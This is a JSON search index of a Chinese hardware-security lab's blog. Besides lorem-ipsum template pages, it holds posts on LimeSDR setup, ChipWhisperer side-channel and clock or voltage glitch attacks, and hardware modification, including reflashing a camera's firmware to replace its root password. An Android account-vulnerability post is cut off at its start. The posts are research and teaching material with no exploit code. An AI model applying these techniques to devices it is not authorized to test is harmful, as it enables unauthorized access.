{"pages":[{"title":"","date":"2017-07-10T17:24:49.624Z","path":"index.html","text":"We are here to help you. Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Multipurpose Template Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Well Documented Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Responsive Design Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. We're committed to our process. Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste. Goal definition Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Analyse Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Implementation Lorem ipsum dolor sit amet sit consectetur adipisicing eiusmod tempor. Recent Work Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde voluptatem. Sed unde omnis iste natus error sit voluptatem. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Amazing Project Agenda corp. Multipurpose Documented Responsive Clean & Fresh Raw denim you probably haven't heard of them jean shorts Austin. Nesciunt tofu stumptown aliqua, retro synth master cleanse. Mustache cliche tempor, williamsburg carles vegan helvetica. Cosby sweater eu banh mi, qui irure terry richardson ex squid Aliquip placeat salvia cillum iphone. Read more Food truck fixie locavore, accusamus mcsweeney's marfa nulla single-origin coffee squid. Exercitation +1 labore velit, blog sartorial PBR leggings next level wes anderson artisan four loko farm-to-table craft beer twee. Qui photo booth letterpress, commodo enim craft beer mlkshk aliquip jean shorts ullamco ad vinyl cillum PBR. Homo nostrud organic, assumenda labore aesthetic magna delectus mollit. Keytar helvetica VHS salvia.. Etsy mixtape wayfarers, ethical wes anderson tofu before they sold out mcsweeney's organic lomo retro fanny pack lo-fi farm-to-table readymade. Messenger bag gentrify pitchfork tattooed craft beer, iphone skateboard locavore carles etsy salvia banksy hoodie helvetica. DIY synth PBR banksy irony. Leggings gentrify squid 8-bit cred pitchfork. Williamsburg banh mi whatever gluten-free, carles pitchfork biodiesel fixie etsy retro mlkshk vice blog. Scenester cred you probably haven't heard of them, vinyl craft beer blog stumptown. Pitchfork sustainable tofu synth chambray yr. Trust fund seitan letterpress, keytar raw denim keffiyeh etsy art party before they sold out master cleanse gluten-free squid scenester freegan cosby sweater. Fanny pack portland seitan DIY, art party locavore wolf cliche high life echo park Austin. Cred vinyl keffiyeh DIY salvia PBR, banh mi before they sold out farm-to-table VHS viral locavore cosby sweater. Lomo wolf viral, mustache readymade thundercats keffiyeh craft beer marfa ethical. Wolf salvia freegan, sartorial keffiyeh echo park vegan. Denim you probably haven't heard of. Lorem ipsum dolor met consectetur adipisicing sit amet, consectetur adipisicing elit, of them jean shorts sed magna aliqua. Lorem ipsum dolor met. Lina Mars Commercial Director Raw denim you Mustache cliche tempor, williamsburg carles vegan helvetica probably haven't heard of them jean shorts austin. Nesciunt tofu stumptown aliqua, retro synth master cleanse. Mustache cliche tempor, williamsburg carles vegan helvetica. Kate Ford Commercial Director Reprehenderit butcher stache cliche tempor, williamsburg carles vegan helvetica.retro keffiyeh dreamcatcher synth. Cosby sweater eu banh mi, qui irure terry richardson ex squid Aliquip placeat salvia cillum iphone. Jake Witson Commercial Director Metronic - The Most Complete &amp; Popular Admin &amp; Frontend Theme Preview Admin Our Clients Lorem dipsum folor margade sitede lametep eiusmod psumquis dolore."},{"title":"About Us","date":"2015-11-16T17:00:51.000Z","path":"about/index.html","text":"伏宸实验室是广东安创科技旗下以研究前沿网络安全为宗旨的专业实验室，着眼于最前沿的安全技术，以物理安全研究为核心，主要研究方向包括：无线电安全、硬件安全、芯片安全、汽车安全、锁具安全、物联网威胁情报等。"},{"title":"About US","date":"2018-06-29T09:17:12.492Z","path":"about/index.html","text":"伏宸实验室是广东安创科技旗下以研究前沿网络安全为宗旨的专业实验室，着眼于最前沿的安全技术，以物理安全研究为核心，主要研究方向包括：无线电安全、硬件安全、芯片安全、汽车安全、锁具安全、物联网威胁情报等。"},{"title":"Contact","date":"2015-11-29T13:00:03.000Z","path":"contact/index.html","text":"Let us help Lorem ipsum sdolor sic amit, bolero carles. Name Email Message Send Cancel"},{"title":"Categories","date":"2017-07-10T17:24:49.624Z","path":"categories/index.html","text":""},{"title":"Projects","date":"2015-11-29T13:00:03.000Z","path":"projects/index.html","text":"All UI Design Web Development Photography Wordpress and Logo Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back Cascusamus et iusto odio At vero eos et accusamus et iusto odio digniss imos duc sasdimus qui sint blanditiis prae sentium voluptatum deleniti atque corrupti quos dolores. Project Name Lorem ipsum dolor sit amet, dolore eiusmod quis tempor incididunt ut et dolore Ut veniam unde nostrudlaboris. Sed unde omnis iste natus error sit voluptatem. Lorem ipsum dolor sit amet, consectetuer adipiscing tempor Adipiscing Get it FREE HTML5/CSS3 Web Deisgn Web Development Shoping Cart Free Storage Cloud Hosting Free Support Awesome UI Visit Project Back"},{"title":"Tags","date":"2017-07-10T17:24:49.624Z","path":"tags/index.html","text":""},{"title":"Login","date":"2017-07-10T17:24:49.624Z","path":"login/index.html","text":"Email * Password * Forget Password? Login or login using: Important Information Duis autem vel eum iriure at dolor vulputate velit esse vel molestie at dolore. More details"}],"posts":[{"title":"LimeSDR 上手指南","date":"2018-08-19T16:00:00.000Z","path":"lime.html","text":"前言LimeSDR 是一款完全开源的SDR产品，和 HackRF 一样，包括 PCB 设计图，FPGA 代码，HOST代码完全公开，方便研究和学习 SDR 系统原理。虽然市面上有很多 SDR 产品，但很少有像 LimeSDR 性价比这么高的。 LimeSDR 支持 100kHz 到 3.8GHz 频率范围，已经可以不需外置上变频器，即可完成短波应用的使用，另外LimeSDR 是一款完全开源的SDR产品包含了 2×2 MIMO 的支持，满足了大部分应用场景。 通过它的一些应用来了解一下其灵活性：蜂窝网络、WiFi、蓝牙、IoT协议（LoRa/SigFox等）、导航、气象信息、航空信息、海事信息、空间通信、还有广播和电视。 这只是 LimeSDR 应用场景的一小部分，你可以应用到你能想到的任何领域。 编译环境软件结构Lime Suite 是一款支持多种硬件平台的软件，包括LimeSDR，LMS7002M收发器，以及使用基于 LMS7 开发的其他硬件。安装 Lime Suite 可以使许多 SDR 应用程序（如GQRX）可以通过中间适配组件 SoapySDR 适配多种 SDR 设备配合使用。 SoapySDR 是位于 LimeSDR 的驱动程序和 SDR 应用程序之间的胶水层。使用一个简单的包装器 (SoapyLMS7), LimeSDR 可以在任何 SoapySDR 或 Gr-OsmoSDR 支持的应用程序中使用。这包括编程环境, 如 Pothos 框架和 GNU Radio，以及像 GQRX 和 CubicSDR 这样的图形应用程序。 安装UHDWiki：http://files.ettus.com/manual/page_build_guide.html12345678$ sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-mako doxygen python-docutils cmake build-essential git$ git clone https://github.com/EttusResearch/uhd$ cd uhd$ cd host &amp;&amp; mkdir build &amp;&amp; cd build$ cmake ../$ make -j5$ sudo make install$ sudo ldconfig 安装SoapySDRWiki：https://github.com/pothosware/SoapySDR/wiki/BuildGuide123456789$ sudo apt-get install cmake g++ libpython-dev python-numpy swig$ git clone https://github.com/pothosware/SoapySDR.git$ cd SoapySDR$ git pull origin master$ mkdir build &amp;&amp; cd build$ cmake ..$ make -j5$ sudo make install$ sudo ldconfig 安装SoapyUHDWiki：https://github.com/pothosware/SoapyUHD/wiki123456$ git clone https://github.com/pothosware/SoapyUHD.git$ cd SoapyUHD$ mkdir build &amp;&amp; cd build$ cmake ..$ make$ sudo make install 安装LimeSuiteWiki：http://wiki.myriadrf.org/Lime_Suite12345678910$ sudo add-apt-repository -y ppa:myriadrf/drivers$ sudo apt-get update$ sudo apt-get install git g++ cmake libsqlite3-dev libsoapysdr-dev libi2c-dev libusb-1.0-0-dev libwxgtk3.0-dev freeglut3-dev$ git clone https://github.com/myriadrf/LimeSuite.git$ cd LimeSuite$ mkdir builddir &amp;&amp; cd builddir$ cmake ../$ make -j5$ sudo make install$ sudo ldconfig 输入下列命令使非ROOT用户可以访问LimeSDR这样基于USB的设备12$ cd LimeSuite/udev-rules$ sudo sh ./install.sh 安装上述驱动后，运行命令检查驱动是否安装成功 然后查看能不能找到设备 安装GNU Radio、gr-osmosdrWiki：https://www.gnuradio.org/doc/doxygen/build_guide.html从源码构建12345678910111213$ sudo apt-get -y install git-core cmake g++ python-dev swig \\$ pkg-config libfftw3-dev libboost-all-dev libcppunit-dev libgsl0-dev \\$ libusb-dev libsdl1.2-dev python-wxgtk3.0 python-numpy \\$ python-cheetah python-lxml doxygen libxi-dev python-sip \\$ libqt4-opengl-dev libqwt-dev libfontconfig1-dev libxrender-dev \\$ python-sip python-sip-dev python-qt4 python-sphinx libusb-1.0-0-dev \\$ libcomedi-dev libzmq-dev$ git clone --recursive https://github.com/gnuradio/gnuradio.git$ cd gnuradio &amp;&amp; mkdir build &amp;&amp; cd build$ cmake ../$ make -j5$ make test$ sudo make install 安装gr-osmosdr支持包Wiki：http://osmocom.org/projects/gr-osmosdr/wiki1234567$ sudo apt-get install libsoapysdr-dev gr-fcdproplus$ git clone git://git.osmocom.org/gr-osmosdr$ cd gr-osmosdr &amp;&amp; mkdir build &amp;&amp; cd build/$ cmake ../$ make$ sudo make install$ sudo ldconfig 安装之后，会看到Soapysdr support在Gnuradio enabled里 测试LimeSDR接收、发射通道GNU Radio和gr-osmosdr安装完成后，我们加载一个接收信号的grc流程图Grc流程图下载地址：https://1drv.ms/f/s!AsE4BpolygfCjGfspV7_Gno3rpy5 RF增益设置为20，IF中频增益设置成12，BB基带增益设置成19天线设置为LNAL 对应的是RX Channel 0 然后运行，按下遥控钥匙，可以看到成功接收到433MHz遥控钥匙的信号，说明GNU Radio和gr-osmosdr安装没有问题。 测试通完接收通道后，我们测试下发射通道，做一个小型FM电台试试*注意请在不干扰正常无线通讯的基础上进行实验 在另一台电脑上打开SDRSharp将FM频率调到104MHz可以明显看到我们发射的信号","tags":[{"name":"LimeSDR","slug":"LimeSDR","permalink":"http://www.future-sec.com/tags/LimeSDR/"},{"name":"无线电","slug":"无线电","permalink":"http://www.future-sec.com/tags/无线电/"}],"categories":[{"name":"无线电安全","slug":"无线电安全","permalink":"http://www.future-sec.com/categories/无线电安全/"}]},{"title":"芯片物理攻击平台 ChipWhisperer 初探","date":"2018-08-19T16:00:00.000Z","path":"chip.html","text":"前言传统基于穷举或纯数学理论层面的分析，对于现代高强度加密算法而言，算力有限导致无法实现穷举，算法的复杂性也无法通过数学工具直接破解，根据近代物理学发展出来的理论，电子设备依赖外部电源提供动力，设备在运行过程中会消耗能量，同时会跟外界环境存在声、光、电、磁等物理交互现象产生，设备本身也可能存在设计薄弱点，通过这些物理泄露或人为进行物理层的修改获取数据，然后运用各类数学工具和模型实现破解。 然而在做物理攻击时，往往需要昂贵的设备，并要具备数学、物理学、微电子学、半导体学、密码学、化学等等多学科的交叉理论知识，因此其技术门槛和攻击成本都很高，目前在刚刚结束的 Blackhat 2018 上，展台上展示了多款 ChipWhisperer 硬件工具,作为亲民型的物理攻击平台，获得了一致的好评。 (图片来源 Newae 官方) ChipWhisperer Lite 版官方商店售价 $250 ，不管是实验学习，还是实战入门，都是极具性价比的，本文主要介绍主流的一些物理攻击手段，以及对 ChipWhisperer 的初步认知，后续将会据此从理论、原理、实验以及实战等角度详细介绍该平台。 物理攻击真正的安全研究不能凌驾于真实的攻防场景，对于物联网安全而言，其核心目标是真实物理世界中的各种硬件设备，真实的攻击场景往往发生在直接针对硬件设备的攻击，因此物联网安全的基石在于物理层的安全，而针对物联网物理攻击手段，是当前物联网面临的最大安全风险之一。 物理攻击就是直接攻击设备本身和运行过程中的物理泄露，根据攻击过程和手段可以分为非侵入攻击、半侵入式攻击和侵入式攻击。ChipWhisperer 平台主要用做非侵入式攻击，包括侧信道和故障注入攻击等。 传统密码分析学认为一个密码算法在数学上安全就绝对安全,这一思想被Kelsey等学者在1998年提出的侧信道攻击(Side-channel Attacks,SCA)理论所打破。侧信道攻击与传统密码分析不同,侧信道攻击利用功耗、电磁辐射等方式所泄露的能量信息与内部运算操作数之间的相关性,通过对所泄露的信息与已知输入或输出数据之间的关系作理论分析,选择合适的攻击方案,获得与安全算法有关的关键信息。目前侧信道理论发展越发迅速，从最初的简单功耗分析（SPA），到多阶功耗分析（CPA），碰撞攻击、模板攻击、电磁功耗分析以及基于人工智能和机器学习的侧信道分析方式，侧信道攻击方式也推陈出新，从传统的直接能量采集发展到非接触式采集、远距离采集、行为侧信道等等。 利用麦克风进行声波侧信道 利用软件无线电实施非接触电磁侧信道 故障攻击就是在设备执行加密过程中，引入一些外部因素使得加密的一些运算操作出现错误，从而泄露出跟密钥相关的信息的一种攻击。一些基本的假设：设定的攻击目标是中间状态值； 故障注入引起的中间状态值的变化；攻击者可以使用一些特定算法（故障分析）来从错误/正确密文对中获得密钥。使用故障的不同场景： 利用故障来绕过一些安全机制（口令检测，文件访问权限，安全启动链）；产生错误的密文或者签名（故障分析）；组合攻击（故障+旁路）。 非侵入式电磁注入 半侵入式光子故障注入 侵入式故障注入 ChipWhisperer简介本系列使用的版本是 CW1173 ChipWhisperer-Lite ，搭载 SAKURA-G 实验板，配合一块 CW303 XMEGA 作为目标测试板。 CW1173 是基于FPGA实现的硬件，软件端基于 python，具有丰富的扩展接口和官方提供的各类 API 供开发调用，硬件通过自带的 OpenADC 模块可以实现波形的捕获，不需要额外的示波器。 板上自带有波形采集端口（MeaSure）和毛刺输出（Glitch）端口，并自带 MOSFET 管进行功率放大。 并提供多种接口触发设置，基本满足一般的攻击需求。 能量攻击芯片物理结构为许多CMOS电路组合而成，CMOS 电路根据输入的不同电信号动态改变输出状态，实现0或1的表示，完成相应的运算，而不同的运算指令就是通过 CMOS 组合电路完成的，但 CMOS电路根据不同的输入和输出，其消耗的能量是不同的，例如汇编指令 ADD 和 MOV ，消耗的能量是不同的，同样的指令操作数不同，消耗的能量也是不同的，例如 MOV 1 和 MOV 2其能量消耗就是不同的，能量攻击就是利用芯片在执行不同的指令时，消耗能量不同的原理，实现秘钥破解。 常用的能量攻击方式就是在芯片的电源输入端（VCC）或接地端（GND）串联一个1到50欧姆的电阻，然后用示波器不断采集电阻两端的电压变化，形成波形图，根据欧姆定律，电压的变化等同于功耗的变化，因此在波形图中可以观察到芯片在执行不同加密运算时的功耗变化。 CW1173 提供能量波形采集端口，通过连接 板上的 MeaSure SMA 接口，就可以对能量波形进行采集，在利用chipwhisperer 开源软件就可以进行分析，可以实现简单能量分析、CPA攻击、模板攻击等。 通过 cpa 攻击 AES 加密算法获取密钥 毛刺攻击ChipWhisperer 提供对时钟、电压毛刺的自动化攻击功能，类似于 web 渗透工具 Burpsuite ，可以对毛刺的宽度、偏移、位置等等参数进行 fuzz ，通过连接板上的 Glitch SMA 接口，就可以输出毛刺，然后通过串口、web 等获取结果，判断毛刺是否注入成功。 时钟毛刺攻击是针对微控制器需要外部时钟晶振提供时钟信号，通过在原本的时钟信号上造成一个干扰，通过多路时钟信号的叠加产生时钟毛刺，也可以通过自定义的时钟选择器产生，CW1173 提供高达 300MHZ 的时钟周期控制，时钟是芯片执行指令的动力来源，通过时钟毛刺可以跳过某些关键逻辑判断，或输出错误数据。 通过 CW1173 时钟毛刺攻击跳过密码验证 电压毛刺是对芯片电源进行干扰造成故障，在一个很短的时间内，使电压迅速下降，造成芯片瞬间掉电，然后迅速恢复正常，确保芯片继续正常工作，可以实现如对加密算法中某些轮运算过程的干扰，造成错误输出，或跳过某些设备中的关键逻辑判断等等 。 对嵌入式设备的电压毛刺攻击 更多随着物理攻击理论和技术的进步，针对硬件芯片的防护手段也随之提高，芯片物理层的攻防一直在不断角力 ，现实环境中，能量采集会受到各种噪声因素的干扰，硬件厂商也会主动实施一些针对物理攻击的防护，单纯依靠 ChipWhisperer 平台难以实现真实场景的攻击，因此还需要结合电磁、声波、红外、光子等多重信息，以及对硬件进行修改，多重故障注入，引入智能分析模型等等组合手段，今后会进一步介绍一些基于 ChipWhisperer 的高级攻击方式和实战分析方法。 参考 ChipWhisperer 官网 wiki https://wiki.newae.com/Main_Page 开源项目 https://github.com/newaetech/chipwhisperer ChipSHOUTER 电磁故障平台 https://github.com/newaetech/ChipSHOUTER USB 附加模块 https://github.com/scanlime/facewhisperer 深度学习侧信道攻击 https://www.riscure.com/publication/lowering-bar-deep-learning-side-channel-analysis/ 使用毛刺攻击提取汽车 ECU 固件 https://www.riscure.com/publication/fault-injection-automotive-diagnostic-protocols/ 《物联网安全百科》 https://iot-security.wiki","tags":[{"name":"侧信道","slug":"侧信道","permalink":"http://www.future-sec.com/tags/侧信道/"},{"name":"ChipWhisperer","slug":"ChipWhisperer","permalink":"http://www.future-sec.com/tags/ChipWhisperer/"}],"categories":[{"name":"芯片安全","slug":"芯片安全","permalink":"http://www.future-sec.com/categories/芯片安全/"}]},{"title":"物联网安全硬件修改系列-硬改","date":"2018-06-26T16:00:00.000Z","path":"iot-security-hardware-modification.html","text":"前言硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。 硬改路由器刷openwrt修改方案目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。 不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。 更换内存芯片openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。 首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。 芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。 清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。 对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。 先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。 确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。 刷编程器固件在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。 芯片放置在烧录座中，用烧录座连接编程器。 编程器刷入固件。 更换闪存芯片把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。 硬改完成全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：http://192.168.1.1/ 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。 openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。 体外分离硬破摄像头修改方案在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。 尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。 成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。 然而事情并不简单。 固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。 拆存储芯片固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。首先拆掉芯片，周围同样采用胶带保护一下。 飞线芯片烧录座飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。 飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。 通电测试，发现机器一切正常，说明改造成功。 烧录固件继续修改固件测试，修改的细节在之后固件修改章节会详细说明，因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。 硬破成功用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。 魔改小米5手机加6G内存修改方案小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。 拆机说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。 主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。 拆内存芯片拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。) 取下芯片后，清洁焊盘。 植锡球BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。 BGA焊接先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。 焊接完成后，使板子自然冷却，然后清洗干净。 魔改完成装机，然后开机测试，一切正常，说明魔改成功。 《物联网安全百科》伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。图书阅读: https://iot-security.wiki/项目地址: https://github.com/yaseng/iot-security-wiki","tags":[{"name":"硬件分析","slug":"硬件分析","permalink":"http://www.future-sec.com/tags/硬件分析/"},{"name":"硬改","slug":"硬改","permalink":"http://www.future-sec.com/tags/硬改/"}],"categories":[{"name":"硬改","slug":"硬改","permalink":"http://www.future-sec.com/categories/硬改/"}]},{"title":"Android账户机制漏洞专题","date":"2018-06-24T16:00:00.000Z","path":"android-account-manager-vulnerabilitys.html","text":"前言Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）。通俗地讲，就是Android系统会开一个异步进程去帮我们登录（验证）账号，就不需要我们每次点开APP的时候还要走一遍登录（验证）账号的流程。我们根据这个机制，找到了三个可以利用的漏洞。 账户机制介绍我们先看一下账户机所运用到的API： 创建账户：首先是class Authenticator extends AbstractAccountAuthenticator ,如下图，该类是账号验证类 ，其中addAccount方法用来定义需要增加账号时的操作，如调用AuthenticatorActivity来进行账号的添加认证： 